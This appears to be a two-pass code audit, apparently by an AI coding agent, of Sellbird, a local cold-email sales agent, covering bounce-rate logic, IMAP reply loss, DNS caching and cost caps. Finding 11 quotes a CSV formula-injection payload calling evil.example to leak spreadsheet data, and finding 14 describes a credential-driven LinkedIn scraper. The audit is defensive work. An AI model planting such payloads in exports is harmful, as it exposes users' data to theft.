# Repo audit — 2026-11-24

**What this repo does:** Sellbird is a local sales agent. Every 15 minutes it wakes up,
finds businesses that match a target profile, finds the owner and their email address,
writes a short cold email, queues it for the user's approval, sends it from the user's
own mailbox, and handles the replies. Everything lives in one SQLite file; a local-only
FastAPI dashboard shows the pipeline.

**Load assumed:** one person, one machine, one loop process plus one dashboard process
sharing the SQLite file. Dozens to low hundreds of emails a day, thousands of companies.
Judged against that, not against a multi-tenant service.

**Test run:** 3536 passed, 192 skipped, **1 failed** (finding 1). 5m41s.

---

## Must fix

### 1. The test suite is red on Windows, so nothing can be committed
`tests/test_sending_mode.py:308-314`

- **What this is:** A test that checks the config writer replaces a symlinked
  `sellbird.local.yaml` in place instead of overwriting the link.
- **Problem:** It calls `Path.symlink_to()`. On Windows, creating a symlink needs
  Developer Mode or an elevated process, so a normal user gets
  `OSError: [WinError 1314] A required privilege is not held by the client`. Windows is a
  supported platform (`tests/test_windows_support.py`, the tray app, the `.cmd` shim
  handling in `claude_runtime`). The project rule is never to commit with failing tests,
  so on Windows that rule blocks every commit.
- **Fix:** The same decorator the repo already uses elsewhere, e.g.
  `tests/test_codex_platform.py:68`:
  `@pytest.mark.skipif(sys.platform == "win32", reason="symlinks need elevation on Windows")`.
  One line. The behaviour it guards is POSIX-specific anyway.
- **If we skip it:** Every Windows contributor either commits with a red suite or deletes
  the test.

### 2. Switching email provider can pause all sending at the first 10 emails
`sellbird/agents/handler.py:1254-1274`

- **What this is:** A safety switch. If too many emails bounce, Sellbird stops sending so
  the user's domain doesn't get blacklisted.
- **Problem:** It compares two counters that don't measure the same thing. `bounce_count`
  is a `settings` row incremented on every bounce ever seen and **never reset** — it
  counts bounces from the legacy Instantly path and bounces that couldn't be matched to
  any prospect. `count_outbox_sent()` counts only `outbox` rows with status `sent`, which
  exist **only** for the native providers (gmail / microsoft / smtp). So a user who ran on
  Instantly, collected, say, 40 bounces, then switched to Gmail as the README recommends,
  trips `40/10 > 5%` on their tenth native email and gets "SENDING PAUSED" with a reason
  that points at list quality. `channels.email.max_bounce_rate`'s own comment
  (`sellbird/config.py:290`) says the rate is "measured over the trailing sends", which
  is not what the code does either.
- **Fix:** Count bounces the same way sends are counted — from a table, over the same
  window. The cheapest correct version: drop the `bounce_count` setting and count
  `actions` rows with `action_type='bounce'` created since the oldest of the last N sent
  outbox rows. Keeps one source of truth and makes the rate genuinely trailing.
- **If we skip it:** A user following the recommended upgrade path hits a hard stop on
  their first day, with a message blaming their prospect list.

---

## Should fix

### 3. `datetime.utcnow()` will stop working
`sellbird/agents/analyst.py:27`

- **What this is:** The timestamp written into `data/analytics.json`.
- **Problem:** `datetime.utcnow()` is deprecated and scheduled for removal; the test run
  prints the warning. Every other module in the repo already uses a local `_utcnow()`
  helper that returns naive UTC properly.
- **Fix:** `datetime.now(timezone.utc).replace(tzinfo=None)`, the same expression used in
  `sellbird/state.py:134`. One line.
- **If we skip it:** The Analyst crashes on a future Python, and the Analyst is what runs
  on idle cycles — so it fails quietly, on the least-watched path.

### 4. The security docstring points at a function that doesn't exist
`sellbird/dashboard_auth.py:29`

- **What this is:** The module docstring is the authoritative description of who may call
  the dashboard API. It's the first thing a reviewer reads.
- **Problem:** It says routes only the user may call "check it
  (``dashboard.require_user``)". There is no `require_user` anywhere in the repo. The real
  enforcement is a different mechanism: `sellbird/agent_policy.py`, an ASGI middleware
  with an allowlist of routes the coding agent's token may reach.
- **Fix:** Replace that clause with a pointer to `sellbird/agent_policy.py` and its
  allowlist. Docs-only.
- **If we skip it:** A reviewer looks for a per-route check, doesn't find it, and either
  assumes the gap is real or adds a redundant second mechanism.

### 5. The same rule is written in four places
`sellbird/agents/sender.py:69-82`, `sellbird/agents/handler.py:39-40`, `sellbird/gate.py:34,38`

- **What this is:** Constants shared by the sender, the handler and the pre-send gate.
- **Problem:** `KILL_SWITCH_KEY = "sending_paused"` and `BOUNCE_COUNT_KEY = "bounce_count"`
  are each defined twice, in two modules. `EMAIL_RE` is the same regex, byte for byte, in
  `sender.py:72` and `gate.py:34`. And the "which email statuses are safe to send to"
  rule exists twice under two names: `gate.DELIVERABLE_STATUSES = {"verified", "risky"}`
  and `sender.SENDABLE_EMAIL_STATUSES_WITH_RISKY = {"verified", "risky"}`. Add a new
  status (an "accept_all" tier, say) and you must find all of them; miss one and the gate
  and the sender disagree about what may go out.
- **Fix:** Move the two settings keys next to `MANUAL_SEND_KEY` in `state.py` (which
  already owns settings-key constants) and import them. Have `sender.py` import `EMAIL_RE`
  and the status set from `gate.py`, which is where the send rules live. Deletes ~8 lines
  and removes four chances to drift.
- **If we skip it:** A future change to the send rules is correct in one module and wrong
  in another, and the tests pass because each module is tested separately.

### 6. Dead constant
`sellbird/agents/sender.py:70`

- **What this is:** `BOUNCE_COUNT_KEY` in the sender.
- **Problem:** Nothing in `sender.py` reads it. Only the handler and the CLI use that key,
  and both reach it through `handler.BOUNCE_COUNT_KEY`.
- **Fix:** Delete the line (and see finding 5).
- **If we skip it:** Someone edits the sender's copy and wonders why the bounce count
  didn't change.

### 7. A parameter nobody uses
`sellbird/main.py:154-156`

- **What this is:** `decide_next_action(brain, state, config, summary=None)`.
- **Problem:** The function's own docstring explains that the decision is deterministic
  and deliberately does **not** call the model — so `brain` is never read. Every test
  passes `None` for it (and most pass `None` for `state` too, since `summary` is given).
- **Fix:** Drop `brain` from the signature and from the one real call site at
  `main.py:405`. The tests already pass `None` positionally, so they need a one-token edit
  each, or make it keyword-only and delete it.
- **If we skip it:** Every reader has to check whether the heartbeat spends a model call
  on routing. The docstring exists only because the parameter misleads.

### 8. A log line that lies on two nights a year
`sellbird/main.py:105-118`, used at `main.py:337`

- **What this is:** "Quiet hours. Sleeping for N minutes."
- **Problem:** `seconds_until_quiet_hours_end` builds the end time with
  `now.replace(hour=..., minute=...)` on a `pytz` datetime. `replace()` keeps the old UTC
  offset, so on the night the clocks move the result is an hour out. The sleep itself is
  correct — it's the polled `while in_quiet_hours(config)` loop right below, added after a
  production stall — so this function now feeds nothing but that one message.
- **Fix:** Either compute it properly
  (`tz.localize(datetime.combine(day, end))`, or `zoneinfo` instead of `pytz`), or drop
  the function and log the quiet-hours window itself (`"Quiet hours until 07:00"`), which
  is what a user actually wants to read. The second option deletes 14 lines.
- **If we skip it:** Twice a year the log says something untrue, and the function stays
  as a trap for whoever next wants to know when quiet hours end.

### 9. A phone number in the do-not-contact list raises a config error
`sellbird/gate.py:95-111`

- **What this is:** `compliance.do_not_contact` — addresses and domains Sellbird must
  never contact.
- **Problem:** `do_not_contact_entries()` raises `ValueError` for any entry that is
  neither an email address nor a domain. That's the right call today (a silently
  non-matching entry is worse than a loud error). But the moment a WhatsApp channel
  exists, the natural thing for a user to put on a do-not-contact list is a phone number,
  and it will refuse to load their config.
- **Fix:** Part of the WhatsApp feature, not a fix on its own: recognise an E.164 number
  as a third entry kind. Noted here so it isn't discovered by a user.
- **If we skip it:** The first person who adds a number to the list can't start Sellbird.

---

## Nice to have

### 10. Every install downloads a browser it probably won't use
`pyproject.toml:29`

- **What this is:** `playwright>=1.40,<2` is a hard dependency.
- **Problem:** It is imported in exactly one place, lazily, inside one function
  (`sellbird/integrations/linkedin.py:127`), for the LinkedIn integration, which is off by
  default (`channels.linkedin.enabled: False`). Everyone pays a large download to install
  Sellbird. (Measured here: it was still downloading after every other dependency had
  installed.)
- **Caveat, and why this is only "nice to have":** `CLAUDE.md` deliberately relies on
  Playwright being present so Claude can open a prospect's site in a real browser and
  check a draft's claims. That's a real reason to keep it. If it moves, it belongs in an
  extra that the setup wizard installs by default, so the capability survives.
- **Fix:** `[project.optional-dependencies] linkedin = ["playwright>=1.40,<2"]`, and
  `sellbird install` installs it unless told not to.
- **If we skip it:** First-run install stays slow, which is the moment a new user is most
  likely to give up.

---

---

# Second pass — 2026-11-24 (the rest of the repo)

The first pass read the sending path, the gate, the dashboard's auth layer and the
outbox half of `state.py`. This one covers what was left. Numbering continues, so
"fix 12" still means one thing.

**How this pass was done:** the first pass read files top to bottom. 19,400 lines was
too much to read that way usefully, so this one swept the whole tree for specific bug
classes first — unbounded caches, negative results cached forever, unguarded `int()` /
`float()` on provider payloads, untrusted text reaching a prompt unfenced, request
input reaching a path or a query, destructive reads, missing CSV escaping, and the
`pytz` `.replace()` DST mistake found in the first pass — then read every hit in full,
plus each module's riskiest function.

## Must fix

### 11. A scraped company name can run a formula on your machine
`sellbird/export.py:121-127`

- **What this is:** `sellbird export` writes prospects to `prospects.csv`, which the
  README and `CLAUDE.md` tell users to open in a spreadsheet or load into a sequencer.
  The columns include `company_name`, `title`, `industry`, `personalization` and both
  name fields.
- **Problem:** every one of those values comes from a website Sellbird scraped, and
  they go into the CSV unescaped. A cell beginning `=`, `+`, `-` or `@` is a formula to
  Excel, Google Sheets and LibreOffice. A company whose page sets its name to
  `=HYPERLINK("https://evil.example/?x="&A1,"Invoice")` gets that formula evaluated
  when the user opens the export, leaking the sheet's contents — or worse with legacy
  DDE. The rest of this repo is careful to the point of paranoia about untrusted web
  text (prompt fencing, `autopilot_review`, the link checks); this is the one path
  where that text walks straight out into another program.
- **Fix:** escape on the way out, in `to_csv`, which is the single choke point: prefix
  any value whose first character is in `=+-@`, tab or CR with a single quote. Four
  lines, no change for ordinary data.
- **If we skip it:** any site in your prospect list can attack whoever opens the
  export, and that person is the user, not the prospect.

### 12. On the SMTP provider, a reply can be lost for good
`sellbird/integrations/smtp_mail.py:151-173`

- **What this is:** `_fetch_unseen` polls IMAP for `UNSEEN` messages and reads each one
  with `conn.fetch(msg_id, "(RFC822)")`.
- **Problem:** a plain `RFC822` fetch — as opposed to `BODY.PEEK[]` — sets the `Seen`
  flag as a side effect, so the message is consumed by the *read* rather than by
  handling it. The Handler is built on the opposite promise: when it cannot handle a
  reply (`BrainUnavailable` because Claude is down, say) it deliberately does not mark
  it processed, returns `complete=False`, and the heartbeat holds sending so the
  message is read again next cycle. Gmail honours that with `confirm_read()` gating its
  history marker; Microsoft re-reads a time window. `SmtpImapProvider` implements no
  `confirm_read` at all, so the next `UNSEEN` search will never return that message.
  The reply is gone, its stop-on-reply never runs, and the follow-up goes out to
  someone who already answered.
- **Fix:** fetch with `BODY.PEEK[]` so reading is not destructive, and add a
  `confirm_read()` that sets `Seen` on the ids the last fetch returned — which is
  exactly the contract the base class documents.
- **If we skip it:** every Claude outage silently drops the replies that arrived during
  it, on the provider the README recommends for anyone not on Gmail.

### 13. One DNS hiccup writes a prospect off permanently
`sellbird/integrations/email_finder.py:149-168`

- **What this is:** `get_mx_host` looks up a domain's mail server and caches the answer
  in a module-level dict.
- **Problem:** it caches *failures* too (`_mx_cache[domain] = None`), and the cache is
  never cleared or expired. `find_email` reads no MX as "cannot receive mail at all"
  and returns `status="invalid"`. That is terminal: `invalid` is not in
  `WRITABLE_EMAIL_STATUSES`, the dashboard shows the prospect as closed out, and
  nothing ever re-verifies. So a transient resolver timeout during a long
  `sellbird run` — one blip, one busy resolver, one flaky VPN — permanently marks every
  prospect at that domain as having a dead address, and the verdict outlives the
  process in the database.
- **Fix:** don't cache the failure. Cache a successful lookup only, and return `None`
  for a failure without remembering it — the same distinction `HunterUnavailable`
  already makes in this file between "no pattern" and "couldn't ask". Then treat an
  unresolvable MX as `guess` rather than `invalid`, so it is retried instead of written
  off.
- **If we skip it:** prospects quietly disappear from the pipeline for network reasons,
  under a status that claims their address is bad.

## Should fix

### 14. The repo says it never touches LinkedIn, and ships a LinkedIn scraper
`sellbird/integrations/linkedin.py`, reached from `sellbird/agents/scout.py:760`

- **What this is:** 433 lines of Playwright automation that logs into LinkedIn with the
  user's own email and password, runs `/search/results/people/` queries and opens
  `/in/` profiles.
- **Problem:** `CLAUDE.md` tells Claude, as a flat statement of fact, that "Sellbird
  never reads ycombinator.com, the accelerators' directories, Crunchbase, PitchBook or
  LinkedIn (their terms forbid scraping), so don't suggest scraping them instead" —
  while the setup steps in the same file say to install a browser "for LinkedIn
  prospecting". Both cannot be true. A user who read the reassurance would not expect
  their LinkedIn account to be at risk of restriction, which is what automated search
  and profile views invite. It is double-gated (`channels.linkedin.enabled`, off by
  default, plus `LINKEDIN_EMAIL`), so nobody scrapes by accident — but it is also the
  largest module in the repo with no test of its own, and it handles a password.
- **Fix:** a decision, not a patch. Either delete the module and the setup step (the
  free OSM and DataForSEO discovery paths already do the job the project recommends),
  or keep it and correct `CLAUDE.md` to say plainly that LinkedIn prospecting exists,
  is off by default, risks the user's account, and is theirs to enable. I would delete
  it: it contradicts the project's stated position, it is the one place a user's
  password is driven through a browser, and it is untested.
- **If we skip it:** the project's own documentation misleads users about what it does
  with their credentials.

### 15. `--max-spend` is not the hard cap it says it is
`sellbird/collectors/discover.py:1780-1791`

- **What this is:** the CLI describes `--max-spend` as a "Hard cap in dollars" and the
  module docstring promises "a budget check inside the loop".
- **Problem:** the check is `if report.actual_cost > max_spend: break`, run *before*
  each query, and nothing predicts what the next query will cost. A run at $0.99
  against a $1.00 cap still issues the next query. Only the Scavio adapters read
  `provider.remaining_budget` and stop themselves (line 1235); DataForSEO Listings,
  SERP and Maps, Serper and TinyFish all ignore it. The overshoot is bounded by one
  query — cents for SERP at $0.006, up to about $0.37 for a Listings query that fills a
  page — so this is money-small and promise-large.
- **Fix:** before each query, compare `actual_cost + provider.estimate([query])`
  against the cap and stop if it would exceed it. The per-query estimate already exists
  on every adapter.
- **If we skip it:** a documented hard cap is soft, which is the kind of thing users
  discover on the bill.

### 16. Two replies with the same subject can collapse into one
`sellbird/integrations/smtp_mail.py:199`

- **What this is:** inbound messages are deduped on `provider_id`, which falls back to
  `f"{from_email}:{subject}"` when a message carries no `Message-ID`.
- **Problem:** two genuine replies from the same person under the same subject
  ("Re: quick question") produce the same key, so the second is treated as already
  processed and dropped. Most mail has a `Message-ID`, so this is rare — but when it
  fires the lost message is a reply, and a person's second message is usually the one
  that says yes.
- **Fix:** include the `Date` header in the fallback key, or use the IMAP UID, which is
  unique per mailbox.
- **If we skip it:** a rare silent dropped reply — finding 12's failure mode, at much
  lower odds.

## Nice to have

### 17. LinkedIn session cookies are briefly world-readable
`sellbird/integrations/linkedin.py:151-158`

- **What this is:** saved session cookies, which are credentials in their own right, as
  the code's own comment says.
- **Problem:** `write_text()` followed by `chmod(0o600)` creates the file with the
  umask's permissions and tightens them afterwards, leaving a window in which another
  local user can read it. `dashboard_auth._publish_token` goes to real trouble to avoid
  exactly this (`O_EXCL | O_NOFOLLOW`, mode set at creation), so the repo already knows
  the pattern.
- **Fix:** `os.open(path, O_WRONLY|O_CREAT|O_EXCL, 0o600)`, as the token writer does.
  Moot if finding 14 removes the module.

### 18. A provider's malformed number can quietly understate spend
`sellbird/collectors/discover.py:589,668`

- **What this is:** `self.last_cost = float(data.get("cost") or 0.0)` on the DataForSEO
  response.
- **Problem:** a non-numeric `cost` raises `ValueError` inside `fetch`, which the run
  loop catches as a generic query failure — so that query's real spend is recorded as
  whatever `last_cost` was reset to (0.0), understating `actual_cost` and the budget
  check built on it.
- **Fix:** one small `_as_float(value, default)` helper, used at both sites.

`Verdict:` Healthy, and unusually careful — the sending path, the pre-send gate, the
dashboard's auth middleware and the outbox claim-then-send sequence are all written like
code that has already been burned once, with the reason recorded in a comment. Fix 1 first
(it blocks committing on Windows), then 2. Everything else is tidying.

`Lean: -~35 lines, -1 dependency (moved to an extra, not removed) possible.`

`Verdict (second pass):` The newly-read code is the same quality as the first pass,
with three exceptions that share a shape: the project is rigorous about untrusted text
*inside* itself and less so where that text leaves for another program (finding 11, the
CSV), or where a protocol has a side effect the code didn't account for (finding 12, the
IMAP read; finding 13, the cached DNS failure). Fix 11 and 12 first: both are silent,
and both hurt the user rather than the prospect.

`Lean (both passes): -~45 lines, -1 dependency possible, and 433 lines deletable if
finding 14 goes the way I would recommend.`

`Read in full across both passes:` the heartbeat loop; the whole Sender and the
Handler's inbound, bounce and reply paths; the pre-send gate and autopilot review; the
dashboard's auth middleware, agent allowlist, static route and request parsing; the
outbox and suppression halves of `state.py`; the Brain's subprocess isolation;
`email_finder.py`; `smtp_mail.py`; `export.py`; `linkedin.py`; `discover.py`'s cost loop
and provider contract; `scout.py`'s prompt construction and strategy gating;
`microsoft.py` and `gmail.py`'s inbound paths; `send_window.py`'s timezone handling;
`public_http.py`; and `phone.py` / `wasi.py`, written this session and then reviewed.

`Swept but not read line by line:` `codex.py`, `profile.py`, `people.py`, `writer.py`,
`trainer.py` (beyond its fetch paths), `precleared.py` (beyond what it sends off the
machine), `mailboxes.py` (beyond secret handling), `signals.py`, `ats.py`,
`deliverability.py`, `instantly.py`, `inbox_cli.py`, `analyst.py`, and `dashboard.py`'s
individual route bodies. Each was checked against the bug-class sweep and on its own
main risk, and these are among the best-tested modules in the repo (codex 6 test files,
precleared 7, writer 5, gmail 4, people / profile / signals / trainer 2 each). A sweep
does not catch a bug that needs the whole function in your head, so this is coverage,
not proof.

`Genuinely unexamined:` `quota.py` (196 lines, the only sizeable module with no test
file of its own; it reads Claude's own OAuth token to show the usage gauges and does not
log it) and the web front-end (`sellbird/web/*.js`, `*.css`) beyond the Outbox rendering
changed this session.

`Not run:` the app against a live mailbox, Instantly, or any paid discovery provider.
Playwright is still not installed, so nothing browser-driven ran — including, notably,
the LinkedIn module in finding 14.
